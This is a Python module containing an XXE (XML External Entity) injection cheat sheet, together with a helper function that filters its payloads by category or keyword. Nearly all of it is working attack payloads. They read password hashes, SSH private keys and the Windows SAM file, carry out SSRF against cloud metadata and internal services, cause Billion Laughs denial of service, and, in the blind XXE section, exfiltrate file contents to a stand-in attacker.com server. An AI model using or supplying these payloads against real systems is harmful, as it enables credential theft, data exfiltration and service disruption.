"""XXE (XML External Entity) cheat sheet."""

XXE_CHEATSHEET = {
    "title": "XXE (XML External Entity) Cheat Sheet",
    "categories": {
        "basic_xxe": {
            "title": "Basic XXE",
            "description": "Basic XML External Entity injection",
            "payloads": [
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "description": "Basic file read"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "description": "Entity declaration only"},
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>', "description": "Read shadow file"},
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>', "description": "Windows boot.ini"},
            ],
        },

        "file_read_linux": {
            "title": "Linux File Read",
            "description": "Read sensitive files on Linux systems",
            "payloads": [
                {"payload": "file:///etc/passwd", "description": "User accounts"},
                {"payload": "file:///etc/shadow", "description": "Password hashes"},
                {"payload": "file:///etc/hosts", "description": "Hosts file"},
                {"payload": "file:///etc/hostname", "description": "Hostname"},
                {"payload": "file:///proc/self/environ", "description": "Environment variables"},
                {"payload": "file:///proc/version", "description": "Kernel version"},
                {"payload": "file:///home/*/.ssh/id_rsa", "description": "SSH private keys"},
                {"payload": "file:///root/.bash_history", "description": "Root bash history"},
                {"payload": "file:///var/www/html/config.php", "description": "Web config"},
            ],
        },

        "file_read_windows": {
            "title": "Windows File Read",
            "description": "Read sensitive files on Windows systems",
            "payloads": [
                {"payload": "file:///c:/boot.ini", "description": "Boot configuration"},
                {"payload": "file:///c:/windows/win.ini", "description": "Windows config"},
                {"payload": "file:///c:/windows/system32/drivers/etc/hosts", "description": "Hosts file"},
                {"payload": "file:///c:/windows/system32/config/SAM", "description": "SAM database"},
                {"payload": "file:///c:/inetpub/wwwroot/web.config", "description": "IIS config"},
            ],
        },

        "ssrf_via_xxe": {
            "title": "SSRF via XXE",
            "description": "Server-Side Request Forgery through XXE",
            "payloads": [
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>', "description": "HTTP request"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>', "description": "AWS metadata"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>', "description": "Port scan SSH"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3306">]>', "description": "Port scan MySQL"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO">]>', "description": "Redis via gopher"},
            ],
        },

        "blind_xxe": {
            "title": "Blind XXE (Out-of-Band)",
            "description": "XXE with no direct output - exfiltrate via external server",
            "payloads": [
                {"payload": '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;', "description": "External DTD"},
                {"payload": '<!ENTITY % xxe SYSTEM "http://attacker.com/?data=%file;">%xxe;', "description": "Data exfiltration"},
                {"payload": '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]>', "description": "Multi-stage exfil"},
            ],
        },

        "xxe_in_formats": {
            "title": "XXE in Different Formats",
            "description": "XXE injection in various file formats",
            "payloads": [
                {"payload": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>', "description": "XXE in SVG"},
                {"payload": "application/xml content with XXE", "description": "XXE in SOAP"},
                {"payload": "XXE in DOCX (word/document.xml)", "description": "XXE in Office docs"},
                {"payload": "XXE in XLSX (xl/workbook.xml)", "description": "XXE in Excel"},
            ],
        },

        "xxe_dos": {
            "title": "XXE Denial of Service",
            "description": "XXE-based DoS attacks (Billion Laughs)",
            "payloads": [
                {"payload": '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>', "description": "Billion Laughs attack"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]>', "description": "Read /dev/random"},
                {"payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/urandom">]>', "description": "Read /dev/urandom"},
            ],
        },

        "xinclude": {
            "title": "XInclude Attacks",
            "description": "XInclude for file inclusion when you can't control DOCTYPE",
            "payloads": [
                {"payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', "description": "XInclude file read"},
                {"payload": '<xi:include parse="text" href="file:///etc/passwd"/>', "description": "Simplified XInclude"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """Get XXE cheatsheet."""
    if category and category in XXE_CHEATSHEET["categories"]:
        result = {
            "title": XXE_CHEATSHEET["title"],
            "categories": {category: XXE_CHEATSHEET["categories"][category]},
        }
    else:
        result = XXE_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
